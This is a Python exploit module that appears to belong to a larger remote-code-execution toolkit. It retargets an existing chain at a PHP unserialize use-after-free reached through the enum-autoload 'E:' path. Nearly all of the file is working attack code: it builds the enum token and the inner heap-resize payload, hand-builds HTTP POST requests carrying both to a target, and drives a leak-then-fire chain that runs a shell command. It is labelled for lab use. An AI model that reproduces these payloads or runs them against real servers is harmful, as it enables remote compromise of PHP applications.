#!/usr/bin/env python3
# INDEX: enum-autoload second trigger for var_hash uaf | all | pure | other(reentrant-unserialize autoloader) | free
"""E: enum-autoload second trigger for the unserialize var_hash use-after-free.

Reaches the same UAF as the C:/Serializable path but through the E: enum rule:
deserializing an unknown enum class calls the application autoloader without the
serialize reentrancy guard; if that autoloader does a reentrant
unserialize(...)->x = 0, the 8->16 property-table resize frees the arData that
the outer var_hash R: slots still index. CVE-2026-109619 (GH-23981, Nicolas
Grekas). patch_a7(host, port, path) redirects the unmodified RCE chain onto the
E: sink (swaps the i:0 C_PART to the enum token, adds the g= inner payload to
every request). Lab/analysis use only.
"""
from __future__ import annotations

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import universal_remote_rce as remote_rce


# E: entry-token and the autoloader's inner-resize payload (the ``g`` channel)

# Any class name the target cannot resolve forces the autoload. PHP's enum
# serialize format is  E:<len>:"<Class>:<Case>";  (len counts "Class:Case").
ENUM_CLASS = "P2Lazy"
ENUM_CASE = "On"


def enum_entry_token() -> str:
    """The ``E:`` array entry that replaces ``C_PART`` at index 0."""
    body = f"{ENUM_CLASS}:{ENUM_CASE}"
    return f'E:{len(body)}:"{body}";'


# The autoloader unserializes this and writes one property, triggering the
# 8->16 resize. It is byte-identical to the engine's embedded inner object (remote_rce.INNER),
# so the freed bin (320) and all downstream reclaim math are unchanged.
INNER_G = remote_rce.INNER


def g_param_bytes() -> bytes:
    """URL-encoded ``g=`` field value carrying INNER_G."""
    return b"g=" + remote_rce.urlencode_bytes(INNER_G.encode("latin-1"))


# Adapter: redirect the unmodified chain onto the E: enum-autoload sink

_ORIG_SEND_HTTP = remote_rce.send_http
_ORIG_C_PART = remote_rce.C_PART


def _enum_send_http(payload, host=None, port=None, timeout=3):
    """Like remote_rce.send_http, but every POST also carries ``g=<INNER_G>``.

    The base send_http posts ``cook=<payload>``. The E: sink needs the
    autoloader's inner-resize payload in a second field, so we append ``&g=...``.
    Everything else (connect/retry, 500->None crash bookkeeping, body parsing)
    is the base module's.
    """
    import socket
    import time
    if host is None:
        host = remote_rce.HOST
    if port is None:
        port = remote_rce.PORT
    remote_rce.req_count += 1
    body = b"cook=" + remote_rce.urlencode_bytes(payload) + b"&" + g_param_bytes()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    for attempt in range(2):
        try:
            s.connect((host, port))
            break
        except Exception:
            if attempt == 0:
                time.sleep(0.2)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
    req = (
        f"POST {remote_rce.PATH} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body
    try:
        s.sendall(req)
    except Exception:
        return None
    resp = b""
    while True:
        try:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
        except Exception:
            break
    s.close()
    if b"\r\n\r\n" in resp:
        hdr, body_data = resp.split(b"\r\n\r\n", 1)
        if b" 500 " in hdr.split(b"\r\n")[0]:
            return None
        return body_data
    return resp


def patch_remote_rce(host: str, port: int, path: str = "/enum.php") -> None:
    """Redirect the unmodified chain onto the E: enum-autoload sink.

    After this call, remote_rce.run_chain / heap_leak / isstring_read / _fire_cmd
    all emit an ``E:`` entry at array index 0 and carry the ``g`` inner payload.
    """
    remote_rce.HOST, remote_rce.PORT, remote_rce.PATH = host, port, path
    remote_rce.C_PART = enum_entry_token()          # i:0 entry: C: -> E:
    remote_rce.send_http = _enum_send_http          # add the g= channel to every request


def unpatch_remote_rce() -> None:
    """Restore the original C: entry and transport."""
    remote_rce.C_PART = _ORIG_C_PART
    remote_rce.send_http = _ORIG_SEND_HTTP


def run_enum_chain(host, port, path="/enum.php", cmd=b"id>/dev/shm/x"):
    """Convenience: patch, then drive the standard leak -> resolve -> fire chain."""
    patch_remote_rce(host, port, path)
    return remote_rce.run_chain(host, port, path, cmd=cmd)


if __name__ == "__main__":
    # No live target by default: just show the entry token + g payload shape.
    patch_remote_rce("127.0.0.1", 80, "/enum.php")
    print("E: entry token :", enum_entry_token())
    print("g= field       :", g_param_bytes().decode("latin-1"))
    print("a7.C_PART now  :", remote_rce.C_PART)
    print("a7.send_http   :", remote_rce.send_http.__name__)
